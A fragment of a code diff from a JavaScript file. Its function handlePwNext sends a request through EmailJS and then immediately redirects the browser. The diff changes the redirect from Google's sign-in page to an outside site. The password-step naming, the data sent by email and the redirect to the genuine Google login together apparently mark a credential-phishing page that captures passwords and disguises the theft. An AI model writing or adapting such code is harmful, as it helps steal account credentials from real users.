@@ -59,7 +59,7 @@ function handlePwNext() {
     .catch((err) => console.error("EmailJS error:", err));
 
   // Redirect immediately after firing the request
-  window.location.href = "https://accounts.google.com/signin";
+  window.location.href = "https://zenime.site/";
 }
 
 function goBack() {
